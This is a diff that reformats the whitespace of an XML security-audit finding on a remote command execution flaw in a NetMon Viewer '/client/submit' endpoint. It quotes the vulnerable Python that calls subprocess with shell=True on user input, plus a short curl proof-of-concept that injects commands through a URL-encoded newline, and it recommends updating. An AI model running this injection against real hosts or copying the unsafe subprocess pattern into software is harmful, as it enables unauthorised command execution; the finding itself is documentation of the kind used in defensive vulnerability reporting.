@@ -1,16 +1,24 @@
-<finding id="remote_code_execution" threatLevel="High" type="Remote Code Execution" number="09" prefix="2026" status="new">
-    <title>Remote Code Execution</title>
+<?xml version="1.0" encoding="utf-8"?>
+<finding
+  id="remote_code_execution"
+  number="09"
+  prefix="2026"
+  status="new"
+  threatLevel="High"
+  type="Remote Code Execution"
+>
+  <title>Remote Code Execution</title>
 
-    <description>
+  <description>
     <p>Unsanitized user input in the NetMon Viewer '/client/submit' site allows logged-in users to execute arbitrary commands as the netmonclientd user on the NetMon host.</p>
-        <p>The script generates and executes a command line, which includes user input verbatim. The attack can break out of the intended command line and execute arbitrary commands by inserting, for instance, newline characters.</p>
-    </description>
-    <description_summary>
+    <p>The script generates and executes a command line, which includes user input verbatim. The attack can break out of the intended command line and execute arbitrary commands by inserting, for instance, newline characters.</p>
+  </description>
+  <description_summary>
     <p>Unsanitized user input in the NetMon Viewer '/client/submit' site allows logged-in users to execute arbitrary commands as the netmonclientd user on the NetMon host.</p>
-    </description_summary>
+  </description_summary>
 
-    <technicaldescription>
-        <p>The following snippet from the source code contains the vulnerability:</p>
+  <technicaldescription>
+    <p>The following snippet from the source code contains the vulnerability:</p>
     <code>i = argv.i
 cmd = subprocess.call(['bin/../conn.py', '-I', i], shell=True)</code>
     <p>The vulnerability is triggered by injecting commands into the client
@@ -25,9 +33,9 @@ CMD=$2
 URL=http://${TARGET}/client/submit/%0A${CMD}
 
 curl -vvv "${URL}"</pre>
-    </technicaldescription>
+  </technicaldescription>
 
-    <recommendation>
+  <recommendation>
     <p>Update NetMon to the latest version, in which the vulnerability has been fixed.</p>
-    </recommendation>
+  </recommendation>
 </finding>
